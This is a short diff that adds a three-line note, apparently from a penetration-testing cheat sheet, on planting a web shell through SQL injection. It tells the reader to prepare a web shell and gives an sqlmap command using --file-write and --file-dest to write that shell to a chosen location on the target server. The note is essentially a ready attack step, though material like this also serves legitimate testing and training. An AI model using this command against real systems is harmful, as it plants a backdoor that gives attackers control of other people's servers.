@@ -1,0 +1,3 @@
+Prepare your web shell and understand where the destination of where you can write files to
+
+sqlmap -u URL --file-write=/path/to/shell --file-dest=/location/of/destination --batch
